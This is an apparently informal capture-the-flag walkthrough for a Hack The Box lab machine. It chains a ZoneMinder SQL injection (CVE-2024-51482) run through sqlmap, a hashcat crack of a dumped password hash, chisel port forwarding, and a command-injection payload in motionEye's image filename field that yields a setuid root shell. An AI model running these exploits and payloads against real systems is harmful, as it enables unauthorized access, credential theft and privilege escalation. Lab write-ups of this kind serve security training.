

1) in the webserver login the the default cerds admin:admin and i find the  ZoneMinder 1.37.63 , googling for a vun for this version i find a sql inejction  CVE-2024-51482
2) exploit it with sqlmap 

- sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --batch -p tid --cookie="ZMSESSID=aabu9rdt6cvrpujhtoar1fhh9m"

- sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --batch -p tid --cookie="ZMSESSID=aabu9rdt6cvrpujhtoar1fhh9m" -D zm --tables

Database: zm
[43 tables]
+----------------------+
| Config               |
| ControlPresets       |
| Controls             |
| Devices              |
| Event_Data           |
| Event_Summaries      |
| Events_Archived      |
| Events_Day           |
| Events_Hour          |
| Events_Month         |
| Events_Tags          |
| Events_Week          |
| Filters              |
| Frames               |
| Groups_Monitors      |
| Groups_Permissions   |
| Mans                 |
| Manufacturers        |
| Models               |
| MonitorPresets       |
| Monitor_Status       |
| Monitors             |
| Monitors_Permissions |
| MontageLayouts       |
| Object_Types         |
| Reports              |
| Sersions             |
| Server_Stats         |
| Servers              |
| Snapshots            |
| Snapshots_Events     |
| States               |
| Stats                |
| Tags                 |
| TriggersX10          |
| User_Preferences     |
| Users                |
| ZonePresets          |
| Zones                |
| Events               |
| Groups               |
| Logs                 |
| Storage              |
+----------------------+

- sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --batch -p tid -D zm -T Users --columns --headers 'Cookie: zmReportsTable.bs.table.searchText=; zmReportsTable.bs.table.pageNumber=1; zmLogsTable.bs.table.pageList=50; zmLogsTable.bs.table.pageNumber=1; AddMonitorsTable.bs.table.searchText=; AddMonitorsTable.bs.table.pageNumber=1; zmControlTable.bs.table.hiddenColumns=%5B%22Id%22%5D; zmSkin=classic; zmCSS=base; ZMSESSID=td3775fe368h9vcbpdjncjn74d'

Username , Password 

- sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --batch -p tid -D zm -T Users --cookie='ZMSESSID=0var4sh42in837emm40g7t0btc' --threads 10 -C Username,Password --where='Username="mark"' --dump 



3) crack the hash 

hashid -m '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.'          

- hashcat -m 3200 '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' /usr/share/wordlists/rockyou.txt
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame


4) login 

5) prvi esc

search for creds we find a conf file /etc/motioneye/motion.conf  for motioneye
# @admin_username admin
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0


in the open port we find motioneye web service runing in the localhost 
 mark@cctv:~$ netstat -tunlp                                    
  tcp        0      0 127.0.0.1:8765          0.0.0.0:*               LISTEN      -    

we will export this service using local port forwarding with chisel 

./chisel_1.10.1_linux_amd64 server --reverse -v -p 7777 # in our attack host
./chisel client 10.10.14.245:7777 R:socks R:8765:127.0.0.1:8765

now open the web interface of the service on http://127.0.0.1:8765/ and login the the creds we find 

               
The web UI attempts to block shell syntax in fields like **Image File Name** using a JavaScript function `configUiValid()`. This can be bypassed by overriding the function in the browser console (F12):

```javascript
configUiValid = function() { return true; };
```



Once validation is bypassed, arbitrary commands can be injected into the **Image File Name** field. When Motion processes the `picture_filename` directive, it evaluates shell syntax like `$(command)`.


1.  Navigate to **Still Images** > **Image File Name**.
2.  Set the value to: `$(cp /bin/sh /tmp/root ; chmod +xs /tmp/root).%Y-%m-%d-%H-%M-%S`
Capture mode = Interval Snapshots
Interval = 10
try take snapsout  y click on the image incon in the camera live view
3.  Apply settings and trigger a snapshot:
    ```bash
    curl "http://127.0.0.1:7999/1/action/snapshot"
    ```

/tmp/root -p
id # root





















